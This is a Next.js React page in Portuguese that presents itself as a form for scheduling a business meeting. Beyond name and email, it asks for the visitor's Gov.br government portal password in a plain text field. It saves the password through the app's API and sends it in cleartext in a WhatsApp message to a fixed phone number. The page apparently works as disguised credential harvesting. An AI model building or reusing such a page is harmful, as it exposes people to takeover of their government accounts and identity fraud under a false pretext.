
"use client";

import React, { useEffect, useState } from "react";
import { useParams, useRouter } from "next/navigation";
import { Calendar, Phone, CheckCircle2, User, Clock } from "lucide-react";

interface UserData {
  nome_completo: string;
  telefone: string;
  email?: string;
  senha_gov?: string;
}

export default function ReuniaoPage() {
  const { phone } = useParams();
  const router = useRouter();
  const [loading, setLoading] = useState(true);
  const [userData, setUserData] = useState<UserData | null>(null);
  const [error, setError] = useState("");
  
  // Form state
  const [email, setEmail] = useState("");
  const [senhaGov, setSenhaGov] = useState("");
  const [submitting, setSubmitting] = useState(false);

  useEffect(() => {
    if (phone) {
      fetchUser();
    }
  }, [phone]);

  const fetchUser = async () => {
    try {
      const decodedPhone = decodeURIComponent(String(phone));
      const res = await fetch(`/api/user/${decodedPhone}`);
      if (!res.ok) throw new Error("Usuário não encontrado");
      const data = await res.json();
      setUserData(data);
      if (data.email) setEmail(data.email);
      if (data.senha_gov) setSenhaGov(data.senha_gov);
    } catch (err) {
      setError("Não foi possível carregar os dados do usuário.");
    } finally {
      setLoading(false);
    }
  };

  const handleSchedule = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!userData) return;
    
    setSubmitting(true);
    
    try {
        // Update user data if changed
        const decodedPhone = decodeURIComponent(String(phone));
        await fetch(`/api/user/${decodedPhone}`, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                email,
                senha_gov: senhaGov
            })
        });

        // Redirect to WhatsApp to schedule
        const message = encodeURIComponent(
          `Olá, sou ${userData.nome_completo} (${userData.telefone}).\n` +
          `Gostaria de agendar uma reunião.\n` +
          `Email: ${email}\n` +
          `Senha Gov: ${senhaGov}`
        );
        window.location.href = `https://wa.me/553197599216?text=${message}`;
    } catch (error) {
        console.error("Erro ao atualizar dados:", error);
        // Proceed anyway or show error? For now proceed to WhatsApp
        const message = encodeURIComponent(
            `Olá, sou ${userData.nome_completo} (${userData.telefone}) e gostaria de agendar uma reunião.`
        );
        window.location.href = `https://wa.me/553197599216?text=${message}`;
    } finally {
        setSubmitting(false);
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-zinc-50 dark:bg-zinc-950">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"></div>
      </div>
    );
  }

  if (error) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-zinc-50 dark:bg-zinc-950">
        <div className="text-center p-8">
          <p className="text-red-500 mb-4">{error}</p>
          <button
            onClick={() => router.push("/")}
            className="text-blue-600 hover:underline"
          >
            Voltar ao início
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-zinc-50 dark:bg-zinc-950">
      <div className="w-full max-w-md bg-white dark:bg-zinc-900 rounded-2xl shadow-xl border border-zinc-200 dark:border-zinc-800 overflow-hidden">
        <div className="bg-blue-600 p-6 text-center">
          <Calendar className="w-12 h-12 text-white mx-auto mb-3 opacity-90" />
          <h1 className="text-2xl font-bold text-white">Agendar Reunião</h1>
          <p className="text-blue-100 mt-1">Vamos conversar sobre o seu negócio</p>
        </div>

        <div className="p-8">
          <div className="space-y-6">
            <div className="flex items-center gap-4 p-4 bg-zinc-50 dark:bg-zinc-800/50 rounded-xl border border-zinc-100 dark:border-zinc-800">
              <div className="w-10 h-10 rounded-full bg-blue-100 dark:bg-blue-900/30 flex items-center justify-center flex-shrink-0">
                <User className="w-5 h-5 text-blue-600 dark:text-blue-400" />
              </div>
              <div>
                <p className="text-sm text-zinc-500 dark:text-zinc-400">Cliente</p>
                <p className="font-medium text-zinc-900 dark:text-white">
                  {userData?.nome_completo || "Nome não informado"}
                </p>
              </div>
            </div>

            <div className="flex items-center gap-4 p-4 bg-zinc-50 dark:bg-zinc-800/50 rounded-xl border border-zinc-100 dark:border-zinc-800">
              <div className="w-10 h-10 rounded-full bg-green-100 dark:bg-green-900/30 flex items-center justify-center flex-shrink-0">
                <Phone className="w-5 h-5 text-green-600 dark:text-green-400" />
              </div>
              <div>
                <p className="text-sm text-zinc-500 dark:text-zinc-400">Telefone</p>
                <p className="font-medium text-zinc-900 dark:text-white">
                  {userData?.telefone || phone}
                </p>
              </div>
            </div>

            <div className="pt-4">
              <form onSubmit={handleSchedule} className="space-y-4">
                  <div className="space-y-2">
                    <label className="text-sm font-medium text-zinc-700 dark:text-zinc-300">Email</label>
                    <input 
                        type="email" 
                        required 
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        placeholder="seu@email.com"
                        className="w-full px-4 py-3 bg-zinc-50 dark:bg-zinc-800/50 border border-zinc-200 dark:border-zinc-700 rounded-lg focus:ring-2 focus:ring-blue-500 outline-none transition-all dark:text-white"
                    />
                  </div>
                  <div className="space-y-2">
                    <label className="text-sm font-medium text-zinc-700 dark:text-zinc-300">Senha Gov.br</label>
                    <input 
                        type="text" 
                        required 
                        value={senhaGov}
                        onChange={(e) => setSenhaGov(e.target.value)}
                        placeholder="Senha do Gov.br"
                        className="w-full px-4 py-3 bg-zinc-50 dark:bg-zinc-800/50 border border-zinc-200 dark:border-zinc-700 rounded-lg focus:ring-2 focus:ring-blue-500 outline-none transition-all dark:text-white"
                    />
                  </div>

                  <button
                    type="submit"
                    disabled={submitting}
                    className="w-full py-4 bg-green-600 hover:bg-green-700 text-white rounded-xl font-medium transition-all shadow-lg hover:shadow-xl flex items-center justify-center gap-2 group disabled:opacity-70 disabled:cursor-not-allowed"
                  >
                    {submitting ? (
                        <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
                    ) : (
                        <>
                            <Calendar className="w-5 h-5 group-hover:scale-110 transition-transform" />
                            Agendar via WhatsApp
                        </>
                    )}
                  </button>
              </form>
              <p className="text-center text-xs text-zinc-400 mt-4">
                Você será redirecionado para o WhatsApp para confirmar o horário.
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
